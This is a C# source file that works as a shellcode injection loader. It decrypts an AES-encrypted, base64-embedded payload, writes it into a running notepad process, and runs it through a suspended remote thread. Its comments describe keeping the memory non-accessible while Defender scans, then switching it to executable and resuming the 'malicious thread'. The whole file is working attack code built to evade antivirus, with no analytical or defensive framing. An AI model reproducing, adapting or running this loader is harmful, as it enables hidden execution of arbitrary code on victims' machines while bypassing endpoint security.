﻿using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.IO;

namespace SuspendedThreadInjection
{
    class Program
    {
        private static byte[] PerformCryptography(byte[] buf, ICryptoTransform cryptoTransform)
        {
            using (var ms = new MemoryStream())
            using (var cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
            {
                cryptoStream.Write(buf, 0, buf.Length);
                cryptoStream.FlushFinalBlock();

                return ms.ToArray();
            }
        }

        public static byte[] Decrypt(byte[] buf, byte[] key, byte[] iv)
        {
            using (var aes = Aes.Create())
            {
                aes.KeySize = 256;
                aes.BlockSize = 128;
                aes.Padding = PaddingMode.Zeros;
                aes.Key = key;
                aes.IV = iv;

                using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                {
                    return PerformCryptography(buf, decryptor);
                }
            }
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern uint ResumeThread(IntPtr hThread);

        static void Main(string[] args)
        {
            IntPtr hProcess;
            IntPtr addr = IntPtr.Zero;

            // get the pid of the notepad process - this can be any process you have the rights to
            // you could even spawn a surregate process if you like
            int pid = Process.GetProcessesByName("notepad")[0].Id;
            Console.WriteLine(pid);


            // get a handle to the explorer process
            // 0x001F0FFF = PROCESS_ALL access right
            hProcess = OpenProcess(0x001F0FFF, false, pid);


            string finalPayload = "AslaU5xFiIohDIlw0kEr/Aqy26mxRIF1xGDEBov4SbTe4VhoqRRi0MZVHOqjDe1GnHwYnveUcdAJFJZnEgfUpHSAr2okPHLdpzwcokHz/ZtTN7FWGqpr/8qC5KowK+1fVCO+MoE5cpiYj664IaVrQDJPdrdRMWR5dM7vPRWzLez5B601OsD7Y5jUKOqkcmo1qF9TJTedHNayh76pCc7TUkAzLXt+wJZp4nlZ7MWBpd1PtzttZOxhW7e3wN1NpakCHmDCVmAN90EN6DyQGZT7jhrjDw/rosqlrjUgXMGZNHJj90jbKMRKlYnquRHPv5lr3ANdWYpSasLaCUQmyEiFVV6B5EMT77Sg2T5b99z3gbIQ2s7vwYvXjbPS7VoAoB7uwrDTbFub9inpjTLgUOIDDHa/EIEoXKn1WN1HMDw28XRmbRmB3Gq13uavTydvt9nSAZ6kYjsmGSN7+Me/oO3sM8Hog4erYKP99myB9tZ9oU3s9sICR/kjQsq4yceM6bVJ6QQsgMKuhncKNGBlUc4N7IONO2/tw7KZ3ntHcTV5odBJJsU8VAXgbSaBrCjgPSoiC2JyJjwyWfh9sRjwfy53x21vuTSxwsRXAssGINqcDbaf7bgTNAatTgCNemYjX+rV1KgGWANICokz5gzaEzyHj2m0BpkheBnv5+B1gsODka4K1xkRbS3k2MIySmq6w+VkA2nXEZlbjBexXyna/3UdVIFzI3jLPG+4Yt+nBJ5whOo4xjuLfozBrwMRTztON9kV6DsAmQwenm4OWM8zI5IAP/qRL+G5bf1X7LdEthiIG6QZ9DHx7qnF3NSaw0/dld8yeaROfbfQOmrhqmozYnpdEZmdkoyLu2Nn4fL/N1GMa1+g5N7zP2jzmCSkPcmO7nOIJtiIHHS5MrW3dd3ezGhkYW8nlIn59l1gy0CdpKNkaGE=";
            byte[] key = new byte[32] { 0x6e, 0xf3, 0x09, 0x80, 0xdf, 0xa4, 0x64, 0xc7, 0xd8, 0xa0, 0xb4, 0x29, 0x4b, 0x25, 0x0b, 0x94, 0x7e, 0xde, 0xe0, 0xe4, 0x7c, 0x20, 0x3a, 0x2a, 0xea, 0xa3, 0xa2, 0x24, 0x94, 0x74, 0x66, 0xd4 };
            byte[] iv = new byte[16] { 0x42, 0xe7, 0x39, 0x57, 0x35, 0x79, 0x5f, 0x8f, 0xc2, 0x49, 0xe6, 0x05, 0xb8, 0x99, 0x32, 0xf8 };
            byte[] decrypted_data = Decrypt(Convert.FromBase64String(finalPayload), key, iv);


            // allocate memory in the remote process
            addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)decrypted_data.Length, 0x3000, 0x40);

            // write buf[] to the remote process memory
            IntPtr outSize;
            WriteProcessMemory(hProcess, addr, decrypted_data, decrypted_data.Length, out outSize);
            VirtualProtectEx(hProcess, addr, (UIntPtr)decrypted_data.Length, 0x01, out uint lpflOldProtect);

            // create the remote thread in a suspended state
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0x00000004, out hThread);

            // let Defender scan the remote process - hopefully not accessing our PAGE_NO_ACCESS memory
            System.Threading.Thread.Sleep(10000);

            // change memory protection to PAGE_EXECUTE_READ_WRITE
            // 0x40 = PAGE_EXECUTE_READ_WRITE
            VirtualProtectEx(hProcess, addr, (UIntPtr)decrypted_data.Length, 0x40, out lpflOldProtect);

            // resume malicious thread
            ResumeThread(hThread);
        }
    }
}